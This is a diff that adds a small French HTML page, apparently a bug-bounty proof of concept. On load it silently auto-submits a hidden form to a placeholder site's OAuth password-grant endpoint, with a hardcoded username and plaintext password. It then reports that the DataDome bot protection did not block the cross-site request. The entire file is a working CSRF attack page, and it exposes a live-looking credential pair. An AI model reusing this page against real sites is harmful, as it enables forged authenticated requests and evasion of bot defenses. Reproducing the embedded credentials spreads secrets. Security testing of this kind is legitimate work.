@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h2>Test DataDome sans CORS</h2>
+    <div id="status">Envoi en cours...</div>
+    
+    <iframe style="display:none" name="result-frame"></iframe>
+    
+    <form id="test-form" action="https://www.target.fr/web/api/auth/oauth" 
+          method="POST" target="result-frame">
+        <input type="hidden" name="client_id" value="web">
+        <input type="hidden" name="scope" value="user">
+        <input type="hidden" name="username" value="raz_26+2@intigriti.me">
+        <input type="hidden" name="password" value="Vh5:U&fGd2mk:sy">
+        <input type="hidden" name="grant_type" value="password">
+    </form>
+
+    <script>
+        document.getElementById('test-form').submit();
+        
+        // Vérifier si la requête a été bloquée
+        setTimeout(() => {
+            // Si on arrive ici, c'est que la requête n'a pas été bloquée
+            // (sinon le navigateur aurait affiché une erreur)
+            document.getElementById('status').innerHTML = 
+                "✅ Requête envoyée avec succès !<br>" +
+                "DataDome n'a pas bloqué la requête CSRF.";
+        }, 3000);
+    </script>
+</body>
+</html>
